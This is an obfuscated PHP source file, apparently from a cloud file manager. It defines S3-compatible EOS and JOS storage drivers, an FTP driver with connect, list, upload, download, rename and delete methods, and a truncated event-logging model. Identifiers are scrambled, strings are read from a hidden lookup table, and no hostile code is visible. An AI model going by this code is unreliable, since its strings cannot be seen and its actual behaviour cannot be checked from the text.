<?php
 goto eÚƒ›Ú›¬«; f¨‹‹Á¹: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Ö™šÜ×¨) { parent::__construct($Ö™šÜ×¨); $this->setSignVersion($_SERVER[Ş­ğŠìÒ][247]); } public function uploadFormData($ ¯³‹ƒæ, $ûïŠüšš = 3600) { $ÊìËÛ° =& $_SERVER[Ş­ğŠìÒ]; $´ùóÔæ§ = $ÊìËÛ°[229]; $Ö¨ “›ƒ = $ÊìËÛ°[270]; $„Ì¦ˆÏ– = $ÊìËÛ°[62]; $ƒ²µÙ§ = gmdate($ÊìËÛ°[271]); $‘Äõû…ƒ = gmdate($ÊìËÛ°[272]); $ñÁù“š = $ÊìËÛ°[273]; $¨ÔÂßÈ© = $ûïŠüšš . $ÊìËÛ°[12]; $Øåğ˜Š = $ÊìËÛ°[274]; $²„êŒ„• = array($this->accessKey, $‘Äõû…ƒ, $this->region, $„Ì¦ˆÏ–, $ñÁù“š); $œŸ¨²‚€ = implode($ÊìËÛ°[8], $²„êŒ„•); $ÃëÍÈ = array($ÊìËÛ°[275] => gmdate($ÊìËÛ°[299], strtotime($ÊìËÛ°[277])), $ÊìËÛ°[278] => array(array($ÊìËÛ°[279] => $this->bucket), array($ÊìËÛ°[280] => $´ùóÔæ§), array($ÊìËÛ°[281], $ÊìËÛ°[282], $ÊìËÛ°[12]), array($ÊìËÛ°[281], $ÊìËÛ°[283], $ÊìËÛ°[12]), array($ÊìËÛ°[281], $ÊìËÛ°[284], $ÊìËÛ°[12]), array($ÊìËÛ°[285] => $Øåğ˜Š), array($ÊìËÛ°[286] => $œŸ¨²‚€), array($ÊìËÛ°[287] => $Ö¨ “›ƒ), array($ÊìËÛ°[288] => $ƒ²µÙ§), array($ÊìËÛ°[289] => $¨ÔÂßÈ©))); $©»‰§ùğ = base64_encode(json_encode($ÃëÍÈ)); $¦‘¯Ä²À = hash_hmac($ÊìËÛ°[290], $‘Äõû…ƒ, $ÊìËÛ°[291] . $this->secret, !0); $ı£úÑÒÕ = hash_hmac($ÊìËÛ°[290], $this->region, $¦‘¯Ä²À, !0); $¡ğ®™Í = hash_hmac($ÊìËÛ°[290], $„Ì¦ˆÏ–, $ı£úÑÒÕ, !0); $µ–™şê¤ = hash_hmac($ÊìËÛ°[290], $ñÁù“š, $¡ğ®™Í, !0); $èÙ©·ËÕ = hash_hmac($ÊìËÛ°[290], $©»‰§ùğ, $µ–™şê¤); $¥Ü±¦Ü‚ = array($ÊìËÛ°[246] => $ÊìËÛ°[12], $ÊìËÛ°[292] => $ÊìËÛ°[12], $ÊìËÛ°[280] => $´ùóÔæ§, $ÊìËÛ°[285] => $Øåğ˜Š, $ÊìËÛ°[293] => $©»‰§ùğ, $ÊìËÛ°[294] => $œŸ¨²‚€, $ÊìËÛ°[295] => $Ö¨ “›ƒ, $ÊìËÛ°[296] => $ƒ²µÙ§, $ÊìËÛ°[297] => $¨ÔÂßÈ©, $ÊìËÛ°[298] => $èÙ©·ËÕ, $ÊìËÛ°[208] => $this->getHost()); return $¥Ü±¦Ü‚; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($µ“æœ×è) { parent::__construct(); if (count($µ“æœ×è) > 0) { $this->_init($µ“æœ×è); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ƒı˜ë¿¦) { $‚êáä´‡ =& $_SERVER[Ş­ğŠìÒ]; global $config; $this->appCharset = $config[$‚êáä´‡[1432]]; $this->systemCharset = $config[$‚êáä´‡[1433]]; if (isset($ƒı˜ë¿¦[$‚êáä´‡[1434]]) && $ƒı˜ë¿¦[$‚êáä´‡[1434]]) { $this->systemCharset = $ƒı˜ë¿¦[$‚êáä´‡[1434]]; } } public function iconvApp($¬¡µ§™) { return $this->iconvTo($¬¡µ§™, $this->systemCharset, $this->appCharset); } public function iconvSystem($¾ıÄßş€) { return $this->iconvTo($¾ıÄßş€, $this->appCharset, $this->systemCharset); } public function getPathOuter($¢éïİ) { $Ÿ‹•Ë…² =& $_SERVER[Ş­ğŠìÒ]; $¢´Á’Ì = $this->iconvApp($this->pathBase); $¢éïİ = $this->iconvApp($¢éïİ); if (substr($¢´Á’Ì, 0, 2) == $Ÿ‹•Ë…²[1406]) { $¢´Á’Ì = BASIC_PATH . substr($¢´Á’Ì, 2); } if (substr($¢éïİ, 0, 2) == $Ÿ‹•Ë…²[1406]) { $¢éïİ = BASIC_PATH . substr($¢éïİ, 2); } $¢´Á’Ì = KodIO::clear($¢´Á’Ì); $¢éïİ = KodIO::clear($¢éïİ); $¢éïİ = substr($¢éïİ, strlen($¢´Á’Ì)); if (empty($this->pathDriver)) { return $¢éïİ; } return $this->pathDriver . $Ÿ‹•Ë…²[8] . ltrim($¢éïİ, $Ÿ‹•Ë…²[8]); } private function _init($–ÛÏçÊÓ = array()) { $ä¡ê•è– =& $_SERVER[Ş­ğŠìÒ]; if (!function_exists($ä¡ê•è–[1435])) { throw new Exception(LNG($ä¡ê•è–[1436])); } $this->config = $–ÛÏçÊÓ; $this->charsetReset($–ÛÏçÊÓ); foreach ($–ÛÏçÊÓ as $Ñ×ëù« => $çä´øî) { if (isset($this->{$Ñ×ëù«})) { $this->{$Ñ×ëù«} = $çä´øî; } } return $this->_login($–ÛÏçÊÓ); } private function _login($¥¡ü¶ÁÉ) { $ÉÄ¾ö’ê =& $_SERVER[Ş­ğŠìÒ]; static $ƒ…–êå = array(); $¨Î©Ûş = md5(json_encode($¥¡ü¶ÁÉ)); if (isset($ƒ…–êå[$¨Î©Ûş])) { foreach ($ƒ…–êå[$¨Î©Ûş] as $èú‘ó°Œ => $ßôŸµè‡) { $this->{$èú‘ó°Œ} = $ßôŸµè‡; } return !0; } $Üâ˜¿İ› = parse_url(trim($this->server, $ÉÄ¾ö’ê[8])); $this->host = $Üâ˜¿İ›[$ÉÄ¾ö’ê[208]]; $Õ»Ì¯»¥ = isset($Üâ˜¿İ›[$ÉÄ¾ö’ê[207]]) && $Üâ˜¿İ›[$ÉÄ¾ö’ê[207]] == $ÉÄ¾ö’ê[1437] ? !0 : !1; $this->scheme = $Õ»Ì¯»¥ ? $ÉÄ¾ö’ê[1438] : $ÉÄ¾ö’ê[1439]; $this->port = isset($Üâ˜¿İ›[$ÉÄ¾ö’ê[209]]) ? $Üâ˜¿İ›[$ÉÄ¾ö’ê[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($ÉÄ¾ö’ê[1440]) . $this->host . $ÉÄ¾ö’ê[4] . $this->port, !0); return !1; } $°½Ôå¬ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$°½Ôå¬) { $this->writeLog(LNG($ÉÄ¾ö’ê[1441]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ˆàÍêìÅ = $this->pasv == $ÉÄ¾ö’ê[91] ? !0 : !1; @ftp_pasv($this->connect, $ˆàÍêìÅ); $ƒ…–êå[$¨Î©Ûş] = array($ÉÄ¾ö’ê[1442] => $this->connect, $ÉÄ¾ö’ê[208] => $this->host, $ÉÄ¾ö’ê[207] => $this->scheme, $ÉÄ¾ö’ê[209] => $this->port); return $°½Ôå¬; } private function _isconn($Ì°ú™Æ¤ = true) { if (is_resource($this->connect)) { return !0; } if (!$Ì°ú™Æ¤) { return !1; } return $this->_login($this->config); } public function mkfile($´äÁ¨ğ¿, $˜£¥Çş‰ = '', $ÇÄ–à´ = REPEAT_RENAME) { if ($this->setContent($´äÁ¨ğ¿, $˜£¥Çş‰)) { return $this->getPathOuter($´äÁ¨ğ¿); } $this->writeLog(LNG($_SERVER[Ş­ğŠìÒ][1443]), !0); return !1; } public function mkdir($ÆşšÓëƒ, $§±Ã–ˆò = REPEAT_SKIP) { $½¹Ô¢ÅÖ =& $_SERVER[Ş­ğŠìÒ]; if (!$ÆşšÓëƒ || $ÆşšÓëƒ == $½¹Ô¢ÅÖ[8]) { return !0; } if (!$this->_isconn()) { return !1; } $ÆşšÓëƒ = $this->iconvSystem($ÆşšÓëƒ); if ($this->_isFolder($ÆşšÓëƒ) || @ftp_mkdir($this->connect, $ÆşšÓëƒ)) { return $this->getPathOuter($ÆşšÓëƒ); } if (!$this->mkdir($this->pathFather($ÆşšÓëƒ))) { return !1; } if ($ÆşšÓëƒ = @ftp_mkdir($this->connect, $ÆşšÓëƒ)) { return $this->getPathOuter($ÆşšÓëƒ); } $this->writeLog(__FUNCTION__ . $½¹Ô¢ÅÖ[1444], !0); return !1; } public function copyFile($Æ€ŠöÖ, $³Ù”©å°) { if (!$this->_isconn()) { return !1; } $¦Ìˆ¯º§ = $this->pathThis($this->iconvSystem($Æ€ŠöÖ)); $ô¬È€ş‰ = $this->tempFile($¦Ìˆ¯º§); $›Û°´ÁĞ = $this->iconvApp($ô¬È€ş‰); $this->download($Æ€ŠöÖ, $›Û°´ÁĞ); $ŒÃ—Æ’Ê = $this->upload($³Ù”©å°, $›Û°´ÁĞ); $this->tempFileRemve($ô¬È€ş‰); return $ŒÃ—Æ’Ê; } public function moveFile($ª¶¡Èş, $ÏÓšÀŞÎ) { if (!$this->_isconn()) { return !1; } $ª¶¡Èş = $this->iconvSystem($ª¶¡Èş); $ÏÓšÀŞÎ = $this->iconvSystem($ÏÓšÀŞÎ); $æÎ‡üÚ÷ = @ftp_rename($this->connect, $ª¶¡Èş, $ÏÓšÀŞÎ); if (!$æÎ‡üÚ÷) { $this->writeLog(__FUNCTION__ . $_SERVER[Ş­ğŠìÒ][1444], !0); return !1; } return $this->getPathOuter($ÏÓšÀŞÎ); } public function delFile($ÎÂÍãÎá) { if (!$this->_isconn()) { return !1; } $ÎÂÍãÎá = $this->iconvSystem($ÎÂÍãÎá); $ğÏ™Ğ£§ = @ftp_delete($this->connect, $ÎÂÍãÎá); if (!$ğÏ™Ğ£§) { $this->writeLog(__FUNCTION__ . $_SERVER[Ş­ğŠìÒ][1444], !0); } return $ğÏ™Ğ£§; } public function delFolder($µò´ªß) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ß´Ë—â¥ = $ùé‘÷Ïæ = array(); $this->fileList($µò´ªß, $ß´Ë—â¥, $ùé‘÷Ïæ, !0); $this->listItemCache = !0; foreach ($ùé‘÷Ïæ as $Üìï¼Ê®) { $˜¤Š»İ“ = $this->iconvSystem($Üìï¼Ê®[$_SERVER[Ş­ğŠìÒ][32]]); $‡´¢ÅØ = @ftp_delete($this->connect, $˜¤Š»İ“); if (!$‡´¢ÅØ) { return !1; } } foreach ($ß´Ë—â¥ as $˜¤Š»İ“) { $˜¤Š»İ“ = $this->iconvSystem($˜¤Š»İ“); $‡´¢ÅØ = @ftp_rmdir($this->connect, $˜¤Š»İ“); if (!$‡´¢ÅØ) { return !1; } } $µò´ªß = $this->iconvSystem($µò´ªß); return @ftp_rmdir($this->connect, $µò´ªß); } public function rename($€Ğ¥Ü§Ã, $ò¥„Ã…„) { $éúëØÓ´ =& $_SERVER[Ş­ğŠìÒ]; if (!$this->_isconn()) { return !1; } $¯‘Ä’»À = $this->fileNameAuto($this->pathFather($€Ğ¥Ü§Ã), $ò¥„Ã…„); $¯‘Ä’»À = $this->iconvSystem($¯‘Ä’»À); $€Ğ¥Ü§Ã = $this->iconvSystem($€Ğ¥Ü§Ã); $ıâ„‘öğ = $this->pathFather($€Ğ¥Ü§Ã); $ÚŠÍ¢—¨ = rtrim($ıâ„‘öğ, $éúëØÓ´[8]) . $éúëØÓ´[8] . $¯‘Ä’»À; $ÛË€§î— = @ftp_rename($this->connect, $€Ğ¥Ü§Ã, $ÚŠÍ¢—¨); if (!$ÛË€§î—) { $this->writeLog(__FUNCTION__ . $éúëØÓ´[1444], !0); return !1; } $ÚŠÍ¢—¨ = $this->iconvApp($ÚŠÍ¢—¨); return $this->getPathOuter($ÚŠÍ¢—¨); } private function folderInfo($á€ñôÁ, $ì°¾„å = false) { $†÷¦¢½Õ =& $_SERVER[Ş­ğŠìÒ]; $äş²İÑ = array($†÷¦¢½Õ[32] => $this->pathThis($á€ñôÁ), $†÷¦¢½Õ[87] => $this->getPathOuter($†÷¦¢½Õ[8] . $á€ñôÁ), $†÷¦¢½Õ[33] => $†÷¦¢½Õ[78]); if ($ì°¾„å) { return $äş²İÑ; } $äş²İÑ[$†÷¦¢½Õ[231]] = $äş²İÑ[$†÷¦¢½Õ[88]] = 0; $äş²İÑ[$†÷¦¢½Õ[232]] = $äş²İÑ[$†÷¦¢½Õ[233]] = !0; return $äş²İÑ; } private function fileInfo($ş­ÚƒÓˆ, $´•Ù‚ğå = false, $™²Ôù¿Ù = array()) { $¨Õôª Í =& $_SERVER[Ş­ğŠìÒ]; $—¨®Úó = array($¨Õôª Í[32] => $this->pathThis($ş­ÚƒÓˆ), $¨Õôª Í[87] => $this->getPathOuter($¨Õôª Í[8] . $ş­ÚƒÓˆ), $¨Õôª Í[33] => $¨Õôª Í[230], $¨Õôª Í[79] => isset($™²Ôù¿Ù[$¨Õôª Í[79]]) ? $™²Ôù¿Ù[$¨Õôª Í[79]] : 0, $¨Õôª Í[169] => $this->ext($ş­ÚƒÓˆ)); if ($´•Ù‚ğå) { return $—¨®Úó; } $—¨®Úó[$¨Õôª Í[231]] = $—¨®Úó[$¨Õôª Í[88]] = 0; $—¨®Úó[$¨Õôª Í[232]] = $—¨®Úó[$¨Õôª Í[233]] = !0; $¶å´ÕÊ© = $this->iconvSystem($ş­ÚƒÓˆ); $—¨®Úó[$¨Õôª Í[88]] = @ftp_mdtm($this->connect, $¶å´ÕÊ©); if (empty($™²Ôù¿Ù)) { $™²Ôù¿Ù = $this->objectMeta($ş­ÚƒÓˆ); if (!$™²Ôù¿Ù) { return $—¨®Úó; } } $—¨®Úó[$¨Õôª Í[79]] = $™²Ôù¿Ù[$¨Õôª Í[79]]; return $—¨®Úó; } public function size($—‹Ó‘Ç¬) { $È®¤„òÚ = $this->objectMeta($—‹Ó‘Ç¬); return $È®¤„òÚ ? $È®¤„òÚ[$_SERVER[Ş­ğŠìÒ][79]] : 0; } public function info($ï‡Óôšô) { if ($this->isFile($ï‡Óôšô)) { return $this->fileInfo($ï‡Óôšô, 0); } else { if ($this->isFolder($ï‡Óôšô)) { return $this->folderInfo($ï‡Óôšô); } } return !1; } private function fileList($Óœ›í¹, &$ñÀñ¡Ô¢, &$şÖá—«, $şòÜòÎÒ = false) { $¸ÇÉ¸±š =& $_SERVER[Ş­ğŠìÒ]; $Óœ›í¹ = $this->iconvSystem($Óœ›í¹); if (!$this->isFolder($Óœ›í¹)) { return !1; } @ftp_chdir($this->connect, $¸ÇÉ¸±š[8]); $Óœ›í¹ = rtrim($Óœ›í¹, $¸ÇÉ¸±š[8]) . $¸ÇÉ¸±š[8]; check_abort(); $Íæ­Öó· = @ftp_rawlist($this->connect, $Óœ›í¹); if (!$Íæ­Öó·) { $Íæ­Öó· = array(); } $Ñ¤§»û = array($¸ÇÉ¸±š[10] => 1, $¸ÇÉ¸±š[1359] => 1); foreach ($Íæ­Öó· as $½˜ıˆÔ) { $š—çª…Ğ = $this->_listItem($½˜ıˆÔ); if ($š—çª…Ğ[0] == $¸ÇÉ¸±š[825]) { continue; } $©·ƒ»ÖÆ = $š—çª…Ğ[8]; if (empty($©·ƒ»ÖÆ) && $©·ƒ»ÖÆ !== $¸ÇÉ¸±š[228] || isset($Ñ¤§»û[$©·ƒ»ÖÆ])) { continue; } $©·ƒ»ÖÆ = $this->iconvApp($Óœ›í¹ . ltrim($©·ƒ»ÖÆ, $¸ÇÉ¸±š[8])); $· ÄÕ¹ = array($¸ÇÉ¸±š[32] => $©·ƒ»ÖÆ, $¸ÇÉ¸±š[33] => $¸ÇÉ¸±š[230], $¸ÇÉ¸±š[79] => $š—çª…Ğ[4]); if (substr($½˜ıˆÔ, 0, 1) == $¸ÇÉ¸±š[1445]) { $· ÄÕ¹[$¸ÇÉ¸±š[33]] = $¸ÇÉ¸±š[78]; $· ÄÕ¹[$¸ÇÉ¸±š[79]] = 0; } $·Îù´¿ı = $· ÄÕ¹[$¸ÇÉ¸±š[33]] == $¸ÇÉ¸±š[78] ? !0 : !1; $this->cacheMethodInfoSet($©·ƒ»ÖÆ, $·Îù´¿ı, $· ÄÕ¹); if ($·Îù´¿ı) { $ñÀñ¡Ô¢[] = $©·ƒ»ÖÆ; if ($şòÜòÎÒ) { $this->fileList($©·ƒ»ÖÆ, $ñÀñ¡Ô¢, $şÖá—«, $şòÜòÎÒ); } continue; } $şÖá—«[] = $· ÄÕ¹; } $this->cacheMethodInfoSet($Óœ›í¹, !0); } private function _listItem($å«È€’±) { if (empty($å«È€’±)) { return array(); } $á‹ñÂ¥ = preg_split($_SERVER[Ş­ğŠìÒ][1446], $å«È€’±); if (count($á‹ñÂ¥) <= 9) { return $á‹ñÂ¥; } $á‹ñÂ¥[8] = trim(substr($å«È€’±, strpos($å«È€’±, $á‹ñÂ¥[7]) + strlen($á‹ñÂ¥[7]))); return array_splice($á‹ñÂ¥, 0, 9); } public function listPath($Ïù–éÏë, $Ì¼ûÒ›¬ = false) { $¹ĞçğÉ” =& $_SERVER[Ş­ğŠìÒ]; if (!$this->_isconn()) { return !1; } $ÂËÂ»æù = $ú¼‚½Ø = array(); $this->fileList($Ïù–éÏë, $ÂËÂ»æù, $ú¼‚½Ø); foreach ($ÂËÂ»æù as $ñª¾íµ‹ => $·‰Ğ›) { $ÂËÂ»æù[$ñª¾íµ‹] = $this->folderInfo($·‰Ğ›, $Ì¼ûÒ›¬); } foreach ($ú¼‚½Ø as $ñª¾íµ‹ => $·‰Ğ›) { $ú¼‚½Ø[$ñª¾íµ‹] = $this->fileInfo($·‰Ğ›[$¹ĞçğÉ”[32]], $Ì¼ûÒ›¬, $·‰Ğ›); } return array($¹ĞçğÉ”[85] => $ÂËÂ»æù, $¹ĞçğÉ”[86] => $ú¼‚½Ø); } public function has($ä½«¤Ğ”, $ƒ’å›üÔ = false, $¿å¯­Äô = true) { $Ó½ä²˜ =& $_SERVER[Ş­ğŠìÒ]; $çÍ¿ùö = $ åÖÄ¸ = array(); $íÛø£‘ó = $ƒ’å›üÔ ? !0 : !1; $this->fileList($ä½«¤Ğ”, $çÍ¿ùö, $ åÖÄ¸, $íÛø£‘ó); if ($ƒ’å›üÔ) { return array($Ó½ä²˜[239] => count($ åÖÄ¸), $Ó½ä²˜[240] => count($çÍ¿ùö)); } if ($¿å¯­Äô) { if (count($ åÖÄ¸)) { return !0; } } else { if (count($çÍ¿ùö)) { return !0; } } return !1; } public function listAll($ø»Ùà’È) { $µµÌÌÀÌ =& $_SERVER[Ş­ğŠìÒ]; if (!$this->_isconn()) { return !1; } $õ şô¸Î = $Ïè•¥ü = array(); $this->fileList($ø»Ùà’È, $õ şô¸Î, $Ïè•¥ü, !0); $¼©çº¨¶ = array_to_keyvalue($Ïè•¥ü, $µµÌÌÀÌ[32]); foreach ($õ şô¸Î as $¯×‡¾¤) { if (is_string($¯×‡¾¤)) { $¼©çº¨¶[$¯×‡¾¤] = array($µµÌÌÀÌ[79] => 0); } } return $this->listAllFiles($ø»Ùà’È, $¼©çº¨¶); } public function getContent($’ıø“û) { if (!$this->_isconn()) { return !1; } $’ıø“û = $this->iconvSystem($’ıø“û); return $this->fileSubstr($’ıø“û); } public function setContent($ê¹¶Üïê, $İúŒëó = '') { if (!$this->_isconn()) { return !1; } $èß®™Ş = $this->pathThis($this->iconvSystem($ê¹¶Üïê)); $¢¸áÉ¸Ğ = $this->tempFile($èß®™Ş); file_put_contents($¢¸áÉ¸Ğ, $İúŒëó); $ºÓÜüŒã = $this->upload($ê¹¶Üïê, $this->iconvApp($¢¸áÉ¸Ğ)); $this->tempFileRemve($¢¸áÉ¸Ğ); return $ºÓÜüŒã; } public function fileSubstr($ç±È¨Á”, $†¦×–ë = 0, $Á÷ƒÑ¸ï = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ç±È¨Á”, $†¦×–ë, $Á÷ƒÑ¸ï); } private function ftpRequest($óı‡Çæ¬, $Œ¡Ù’Š® = 0, $¬šúéÃ¯ = false) { $óı‡Çæ¬ = $this->iconvSystem($óı‡Çæ¬); $ç†„ÙÔÁ = $this->scheme . $this->host . $_SERVER[Ş­ğŠìÒ][4] . $this->port; $ô©ØËÖê = curl_init(); curl_setopt($ô©ØËÖê, CURLOPT_URL, $ç†„ÙÔÁ . $this->pathEncode($óı‡Çæ¬)); curl_setopt($ô©ØËÖê, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($¬šúéÃ¯) { $£â†µÕÏ = $Œ¡Ù’Š® + $¬šúéÃ¯ - 1; curl_setopt($ô©ØËÖê, CURLOPT_RANGE, "{$Œ¡Ù’Š®}\x2d{$£â†µÕÏ}"); } curl_setopt($ô©ØËÖê, CURLOPT_RETURNTRANSFER, 1); $Óƒ¶å¥ = curl_exec($ô©ØËÖê); curl_close($ô©ØËÖê); return $Óƒ¶å¥; } public function upload($Æ¯¯üÂ, $éÎçô…, $ÃÉ¹¬Ìı = false, $©ÔÏâÄ… = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Æ¯¯üÂ))) { return !1; } $Æ¯¯üÂ = $this->iconvSystem($Æ¯¯üÂ); $éÎçô… = $this->iconvSystem($éÎçô…); $È“ÏÚ¢© = ftp_nb_put($this->connect, $Æ¯¯üÂ, $éÎçô…, FTP_BINARY); while ($È“ÏÚ¢© == FTP_MOREDATA) { $È“ÏÚ¢© = ftp_nb_continue($this->connect); } if ($È“ÏÚ¢© != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[Ş­ğŠìÒ][1444], !0); return !1; } return $this->getPathOuter($Æ¯¯üÂ); } public function download($ı—±Ú†ã, $É•ûúÏ’ = '') { if (!$this->_isconn()) { return !1; } $—ü ªÅÊ = $this->pathFather($É•ûúÏ’); if (!IO::mkdir($—ü ªÅÊ)) { return !1; } $ı—±Ú†ã = $this->iconvSystem($ı—±Ú†ã); $É•ûúÏ’ = $this->iconvSystem($É•ûúÏ’); $‚‹”ö×† = ftp_nb_get($this->connect, $É•ûúÏ’, $ı—±Ú†ã, FTP_BINARY); while ($‚‹”ö×† == FTP_MOREDATA) { $‚‹”ö×† = ftp_nb_continue($this->connect); } if ($‚‹”ö×† != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[Ş­ğŠìÒ][1444], !0); return !1; } return $this->iconvApp($É•ûúÏ’); } public function exist($û‘ÔÑ‹…) { return $this->isFile($û‘ÔÑ‹…) || $this->isFolder($û‘ÔÑ‹…); } public function isFile($Ç§óç™Ë) { return !$this->isFolder($Ç§óç™Ë) && $this->objectMeta($Ç§óç™Ë); } public function isFolder($ÄÆëÔÃÆ) { return $this->cacheMethod($_SERVER[Ş­ğŠìÒ][179], $ÄÆëÔÃÆ); } protected function objectMeta($¾Øà»Ï§) { return $this->cacheMethod($_SERVER[Ş­ğŠìÒ][181], $¾Øà»Ï§); } protected function _objectMeta($Û¡½·‚—) { $¶‰‡ë¾Ã =& $_SERVER[Ş­ğŠìÒ]; if ($Û¡½·‚— == $¶‰‡ë¾Ã[12] || $Û¡½·‚— == $¶‰‡ë¾Ã[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Û¡½·‚— = $this->iconvSystem($Û¡½·‚—); $¸ÃÏ³„Ø = array($¶‰‡ë¾Ã[32] => $this->iconvApp($Û¡½·‚—), $¶‰‡ë¾Ã[33] => $¶‰‡ë¾Ã[230], $¶‰‡ë¾Ã[79] => 0); @ftp_chdir($this->connect, $¶‰‡ë¾Ã[8]); $×’Öõ¼ = @ftp_size($this->connect, $Û¡½·‚—); if ($×’Öõ¼ != -1) { $¸ÃÏ³„Ø[$¶‰‡ë¾Ã[79]] = $×’Öõ¼; } else { $Õ’€ÓÓè = @ftp_chdir($this->connect, $Û¡½·‚—); if (!$Õ’€ÓÓè) { return !1; } $¸ÃÏ³„Ø[$¶‰‡ë¾Ã[33]] = $¶‰‡ë¾Ã[78]; } return $¸ÃÏ³„Ø; } protected function _isFolder($ã‹æÂ€è) { $¸¡æô¢» =& $_SERVER[Ş­ğŠìÒ]; if ($ã‹æÂ€è == $¸¡æô¢»[12] || $ã‹æÂ€è == $¸¡æô¢»[8]) { return !0; } $Ó±ÂİŸÇ = $this->_objectMeta($ã‹æÂ€è); return isset($Ó±ÂİŸÇ[$¸¡æô¢»[33]]) && $Ó±ÂİŸÇ[$¸¡æô¢»[33]] == $¸¡æô¢»[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($ª‚ä£Ã) { parent::__construct($ª‚ä£Ã); $this->setSignVersion($_SERVER[Ş­ğŠìÒ][247]); } public function uploadLink($’“É“Š, $àÏÇ¥¡ = 0) { $Ñó¬›úÀ =& $_SERVER[Ş­ğŠìÒ]; if ($this->isUploadServer()) { return; } $¤­™şŠ = $this->getType(); if (!in_array($¤­™şŠ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $óú‡©“Å = (!$àÏÇ¥¡ ? 1 : ceil($àÏÇ¥¡ / pow(1024, 3))) * 3600 * 4; $Á¥°ïš½ = $this->multiUploadFormData($’“É“Š, $óú‡©“Å); if ($Á¥°ïš½) { $Á¥°ïš½[$Ñó¬›úÀ[97]] = $’“É“Š; $Á¥°ïš½[$Ñó¬›úÀ[98]] = $¤­™şŠ; } return $Á¥°ïš½; } public function fileOutImage($ÑÄóùï, $ò…àÆ¹Á = 250) { if ($this->size($ÑÄóùï) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ÑÄóùï, $ò…àÆ¹Á); } $à ãŒ¢Ÿ = $this->link($ÑÄóùï); $à ãŒ¢Ÿ .= $_SERVER[Ş­ğŠìÒ][1447] . $ò…àÆ¹Á; $this->fileOutLink($à ãŒ¢Ÿ); } public function fileOutLink($ñ÷ï‚ªŠ) { $µÙÎÏÎ‘ =& $_SERVER[Ş­ğŠìÒ]; if (substr($ñ÷ï‚ªŠ, 0, 7) == $µÙÎÏÎ‘[313]) { $ñ÷ï‚ªŠ = $µÙÎÏÎ‘[314] . substr($ñ÷ï‚ªŠ, 7); } header($µÙÎÏÎ‘[175] . $ñ÷ï‚ªŠ); die; } } goto aŠ¢Ê‘Ÿ‰µ; d‹†Ÿˆª×Ş: class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\165\x72\143\x65\137\145\166\x65\156\x74"; protected $dataAuto = array(array("\143\162\145\141\x74\x65\x54\x69\x6d\145", "\x74\151\x6d\145", "\151\x6e\x73\145\162\164", "\x66\x75\x6e\x63\164\151\x6f\x6e"), array("\x64\145\x73\143", '', "\x69\156\163\145\162\x74\54\165\160\x64\x61\x74\x65\54\x73\145\x6c\x65\143\164", "\152\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ôĞ¶ÑÁÃ, $üÇéÉ¾, $É½¥ıà¸ = '') { $ê†êÈ¸¨ =& $_SERVER[Ş­ğŠìÒ]; if (!$this->eventSave) { return; } $’ªõ°Š” = Model($ê†êÈ¸¨[1414])->sourceInfo($ôĞ¶ÑÁÃ); if (!$’ªõ°Š”) { return !1; } if ($this->isDisableEvent($’ªõ°Š”, $üÇéÉ¾)) { return; } if ($É½¥ıà¸ && is_string($É½¥ıà¸)) { $É½¥ıà¸ = array($ê†êÈ¸¨[2003] => $É½¥ıà¸); } $ß¶¤Ñõ = defined($ê†êÈ¸¨[2190]) ? USER_ID : 0; $İÚÈÌèª = array($ê†êÈ¸¨[491] => $ôĞ¶ÑÁÃ, $ê†êÈ¸¨[2191] => $’ªõ°Š”[$ê†êÈ¸¨[192]], $ê†êÈ¸¨[2192] => $’ªõ°Š”[$ê†êÈ¸¨[32]], $ê†êÈ¸¨[582] => !empty($’ªõ°Š”[$ê†êÈ¸¨[582]]) ? $’ªõ°Š”[$ê†êÈ¸¨[582]] : $ê†êÈ¸¨[12], $ê†êÈ¸¨[1755] => $ß¶¤Ñõ, $ê†êÈ¸¨[496] => $üÇéÉ¾, $ê†êÈ¸¨[1757] => $É½¥ıà¸); $this->addSystemLog($üÇéÉ¾, $İÚÈÌèª); unset($İÚÈÌèª[$ê†êÈ¸¨[2192]], $İÚÈÌèª[$ê†êÈ¸¨[582]]); return $this->add($İÚÈÌèª); } private function addSystemLog($¯õé–Ñ…, $ÛÒŞÖ³À) { $Ô¡ó”ş¿ =& $_SERVER[Ş­ğŠìÒ]; if ($¯õé–Ñ… == $Ô¡ó”ş¿[2193]) { $¯õé–Ñ… = $ÛÒŞÖ³À[$Ô¡ó”ş¿[526]][$Ô¡ó”ş¿[2194]]; } else { if (in_array($¯õé–Ñ…, array($Ô¡ó”ş¿[1942], $Ô¡ó”ş¿[2195]))) { $¯õé–Ñ… = $ÛÒŞÖ³À[$Ô¡ó”ş¿[526]][$Ô¡ó”ş¿[171]]; } } $Ï‚¹êˆ¶ = array_merge($ÛÒŞÖ³À, array($Ô¡ó”ş¿[2196] => $ÛÒŞÖ³À[$Ô¡ó”ş¿[193]], $Ô¡ó”ş¿[2197] => $ÛÒŞÖ³À[$Ô¡ó”ş¿[2197]])); Hook::trigger($Ô¡ó”ş¿[2198], $Ô¡ó”ş¿[2199] . $¯õé–Ñ…, $ÛÒŞÖ³À); Model($Ô¡ó”ş¿[1906])->addLog($Ô¡ó”ş¿[2199] . $¯õé–Ñ…, $Ï‚¹êˆ¶); } private function isDisableEvent($Ä«Ã˜€¢, $ª£¼¸) { 